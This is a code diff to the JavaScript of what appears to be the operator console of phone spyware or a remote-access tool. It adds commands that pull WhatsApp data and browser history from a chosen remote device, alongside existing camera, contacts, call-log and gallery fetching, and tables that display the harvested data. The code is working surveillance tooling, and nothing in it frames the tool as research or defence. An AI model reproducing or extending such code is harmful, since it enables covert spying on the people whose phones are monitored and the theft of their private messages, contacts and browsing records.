@@ -15,6 +15,23 @@ var mp = new Map();
     conn.send(msg);
   }
 
+  function whatsapp(){
+    var msg={};
+    msg.device=active_device.device_id;
+    msg.cmd="whatsapp";
+    msg=JSON.stringify(msg);
+    console.log("sending : "+msg);
+    conn.send(msg);
+  }
+
+  function browserhistory(){
+    var msg={};
+    msg.device=active_device.device_id;
+    msg.cmd="browserhistory";
+    msg=JSON.stringify(msg);
+    console.log("sending : "+msg);
+    conn.send(msg);
+  }
   function camera(x){
     var msg={};
     msg.device=active_device.device_id;
@@ -72,7 +89,7 @@ var mp = new Map();
 
   function build_contacts_table(name){
     $.getJSON("../data/"+name,function(data){
-      var htmlString='<table id="contacts_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>ID</th><th>Name</th><th>Number(s)</tr></thead><tbody>';
+      var htmlString='<table id="contacts_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>ID</th><th>Name</th><th>Number(s)</th></tr></thead><tbody>';
       for(var i=0;i<data.length;i++){
         var row="<tr>";
         var numbs=data[i].phones;
@@ -88,6 +105,26 @@ var mp = new Map();
     });
   }
 
+
+  function build_browserhistory(name){
+    $.getJSON("../data/"+name,function(data){
+      var htmlString='<table id="browserhistory_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>ID</th><th>Site</th><th>Time</th><th>Visits</th></tr></thead><tbody>';
+      for(var i=0;i<data.length;i++){
+        var row="<tr>";
+        var time=new Date(parseInt(data[i].time));
+        if(parseInt(data[i].time)<0)
+          time="--";
+        else time = "<p hidden>"+time.getTime()+"</p>"+time.toLocaleString();
+        row+="<td>"+data[i].id+"</td><td><a target=newtab href=\""+data[i].url+"\">"+data[i].title+"</a></td><td>"+time+"</td><td>"+data[i].visits+"</td>";
+        row+="</tr>";
+        htmlString+=row;
+      }
+      htmlString+="</tbody></table>";
+      $("#browserhistory_fetch").html(htmlString);
+      $("#browserhistory_fetch_table").DataTable();
+      $("*").css("cursor", "default");
+    });
+  }
   function build_call_log_table(name){
     $.getJSON("../data/"+name,function(data){
       var htmlString='<table id="calllog_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>Name</th><th>Number</th><th>Time</th><th>Duration</th><th>Type</th></tr></thead><tbody>';
@@ -105,13 +142,15 @@ var mp = new Map();
         }
         var time=get_elapsed_time(data[i].duration);
         time= time.substr(0,time.length-4);
-        row+="<td>"+data[i].name+"</td><td>"+data[i].number+"</td><td>"+d.toLocaleString()+"</td><td>"+time+"</td><td>"+ct+"</td>";
+        row+="<td>"+data[i].name+"</td><td>"+data[i].number+"</td><td><p hidden>"+d.getTime()+"</p>"+d.toLocaleString()+"</td><td>"+time+"</td><td>"+ct+"</td>";
         row+="</tr>";
         htmlString+=row;
       }
       htmlString+="</tbody></table>";
       $("#calllog_fetch").html(htmlString);
-      $("#calllog_fetch_table").DataTable();
+      $("#calllog_fetch_table").DataTable({
+        "order": [[ 2, "desc" ]]
+    } );
       $("*").css("cursor", "default");
     });
   }
@@ -148,8 +187,9 @@ var mp = new Map();
   }
 
   function build_gallery_fetcher(){
+    console.log("Gallery Data Requested");
     $.getJSON("../db/get_gallery.php?device_id="+active_device.device_id,function(data){
-      console.log(data[0]);
+      console.log("Gallery Data Received");
       var htmlString='<table id="gallery_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>Folder</th><th>Path</th><th>Cache</th></thead><tbody>';
       for(var i=0;i<data.length;i++){
         var row="<tr>";
@@ -180,8 +220,11 @@ var mp = new Map();
       case "contacts":
       build_contacts_table(msg.list);
       break;
+      case "browserhistory":
+      build_browserhistory(msg.list);
+      break;
       case "gallery_progress":
-      $("#gallery_proggress_bar").css("width",Math.ceil((msg.done*100)/msg.total));
+      $("#gallery_proggress_bar").css("width",Math.ceil((msg.done*100)/msg.total)+"%");
       if(msg.done == msg.total){
         setTimeout(function(){
           $("#gallery_proggress_bar").parent().slideUp();
@@ -197,9 +240,17 @@ var mp = new Map();
       case "camera":
       preview_base64(msg.response);
       $("*").css("cursor", "default");
+      if(frames>=1){
+        $("#frame-slider").data("ionRangeSlider").update({from:frames});
+        frames-=1;
+      }
       break;
       case "response_error":
       alert("Error : "+msg.message);
       $("*").css("cursor", "default");
+      break;
+      case "error_reporting":alert(msg.msg);
+      $("*").css("cursor", "default");
+      break;
     }
   }
